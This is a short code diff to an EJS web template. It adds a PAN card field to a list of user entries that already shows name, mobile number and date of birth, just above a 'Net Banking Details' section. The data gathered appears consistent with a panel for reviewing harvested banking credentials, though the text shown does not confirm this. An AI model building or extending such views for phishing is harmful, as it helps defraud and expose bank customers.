@@ -18,19 +18,21 @@
     <!-- User Details Section -->
     <h2>User Details</h2>
 
-    <% if (userEntries.length > 0) { %>
-      <% userEntries.forEach((entry, index) => { %>
-        <div class="card">
-          <h3>User Information - <%= index + 1 %></h3>
-          <p><strong>Name:</strong> <%= entry.name %></p>
-          <p><strong>Mobile Number:</strong> <%= entry.mobileNumber %></p>
-          <p><strong>DOB:</strong> <%= entry.dob %></p>
-          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
-        </div>
-      <% }); %>
-    <% } else { %>
-      <p>No User Data Found</p>
-    <% } %>
+   <% if (userEntries.length > 0) { %>
+  <% userEntries.forEach((entry, index) => { %>
+    <div class="card">
+      <h3>User Information - <%= index + 1 %></h3>
+      <p><strong>Name:</strong> <%= entry.name %></p>
+      <p><strong>Mobile Number:</strong> <%= entry.mobileNumber %></p>
+      <!-- Display PAN Card -->
+      <p><strong>PAN Card:</strong> <%= entry.panCard %></p>
+      <p><strong>DOB:</strong> <%= entry.dob %></p>
+      <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+    </div>
+  <% }); %>
+<% } else { %>
+  <p>No User Data Found</p>
+<% } %>
 
     <!-- NetBanking Details Section -->
     <h2>Net Banking Details</h2>
